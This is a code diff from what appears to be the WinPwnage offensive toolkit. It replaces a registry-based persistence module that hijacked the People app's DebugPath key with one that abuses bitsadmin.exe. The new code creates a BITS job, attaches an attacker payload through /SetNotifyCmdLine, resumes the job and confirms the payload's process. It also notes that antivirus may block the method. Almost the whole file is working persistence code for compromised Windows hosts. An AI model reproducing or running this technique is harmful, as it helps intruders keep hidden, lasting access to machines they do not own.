@@ -1,71 +1,75 @@
-try:
-	import _winreg   # Python 2
-except ImportError:      # Python 3
-	import winreg as _winreg
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
+from winpwnage.core.winstructures import *
+import tempfile
+import time
+import os
 
-#https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/
+#Creds: https://oddvar.moe and https://github.com/3gstudent/bitsadminexec
 
 persistMethod11_info = {
-	"Description": "Persistence using People windows app",
-	"Method": "Registry key (Class) manipulation",
+	"Description": "Persistence using bitsadmin.exe",
+	"Method": "Malicious bitsadmin job",
 	"Id": "11",
 	"Type": "Persistence",
-	"Fixed In": "99999",
-	"Works From": "14393",
-	"Admin": False,
+	"Fixed In": "99999" if information().admin() == True else "0",
+	"Works From": "7600",
+	"Admin": True,
 	"Function Name": "persistMethod11",
 	"Function Payload": True,
 }
 
-def find_people():
-	index = 0
-	people_version = []
-	
-	try:
-		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
-								"Software\Classes\ActivatableClasses\Package",
-								0,
-								_winreg.KEY_READ)
-	except Exception as error:
-		print_error("Unable to open registry key, exception was raised: {}".format(error))
-		return False
-
-	try:
-		num = _winreg.QueryInfoKey(key)[0]
-		for x in range(0, num):
-			if "Microsoft.People_" in _winreg.EnumKey(key, x):
-				people_version.append(_winreg.EnumKey(key, x))
-				break
-	except WindowsError as error:
-		pass
-		
-	return people_version
-
-def persistMethod11(payload, add=True):
-	try:
-		kpath = os.path.join("Software\Classes\ActivatableClasses\Package",
-								find_people()[0],
-								"DebugInformation\\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca")
-	except IndexError:
-		print_error("Unable to add persistence, People app is unavailable on this system")
+def persistMethod11(payload, name="", add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
 		return False
 
 	if add:
 		if payloads().exe(payload):
-			if registry().modify_key(hkey="hkcu", path=kpath, name="DebugPath", value=payloads().exe(payload)[1], create=True):
-				print_success("Successfully created DebugPath key containing payload ({payload})".format(payload=payloads().exe(payload)[1]))
-				print_success("Successfully installed persistence, payload will run at login")
+			# if fails, anti-virus is probably blocking this method
+			with disable_fsr():
+				exit_code = process().create("bitsadmin.exe", params="/create {}".format(name), get_exit_code=True)
+				if exit_code == 0:
+					print_success("Successfully created job ({}) exit code ({})".format(name, exit_code))
+				else:
+					print_error("Unable to create job ({}) exit code ({})".format(name, exit_code))
+
+				exit_code = process().create("bitsadmin.exe", params="/addfile {} {} {}".format(name,os.path.join(information().system_directory(),
+							"cmd.exe"),os.path.join(tempfile.gettempdir(),"cmd.exe")), get_exit_code=True)
+				if exit_code == 0:
+					print_success("Successfully added file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))
+				else:
+					print_error("Unable to add file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))
+
+				exit_code = process().create("bitsadmin.exe", params='/SetNotifyCmdLine {} {} NULL'.format(name, payloads().exe(payload)[1]), get_exit_code=True)
+				if exit_code == 0:
+					print_success("Successfully attached payload ({}) to job ({}) exit code ({})".format(payloads().exe(payload)[1], name, exit_code))
+				else:
+					print_error("Unable to attach payload ({}) to job ({}) exit code ({})".format(payloads().exe(payload)[1], name, exit_code))
+
+				exit_code = process().create("bitsadmin.exe", params="/Resume {}".format(name), get_exit_code=True)
+				if exit_code == 0:
+					print_success("Successfully initiated job ({}) exit code ({})".format(name, exit_code))
+				else:
+					print_error("Unable to initiate job ({}) exit code ({})".format(name, exit_code))
+
+			time.sleep(5)
+
+			pid = process().get_process_pid(os.path.split(payloads().exe(payload)[1])[1])
+			if pid:
+				print_success("Successfully started payload PID: {}".format(pid))
 			else:
-				print_error("Unable to add persistence, exception was raised: {}".format(error))
-				return False
+				print_error("Unable to start payload")
 		else:
 			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		if registry().remove_key(hkey="hkcu", path=kpath, name="DebugPath"):
-			print_success("Successfully removed persistence")
+		print_info("Performing cleanup")
+		exit_code = process().create("bitsadmin.exe",
+					params="/complete {}".format(name),
+					get_exit_code=True)
+
+		if exit_code == 0:
+			print_success("Successfully deleted job ({}) exit code ({})".format(name, exit_code))
 		else:
-			print_error("Unable to remove persistence")
-			return False
+			print_error("Unable to delete job ({}) exit code ({})".format(name, exit_code))
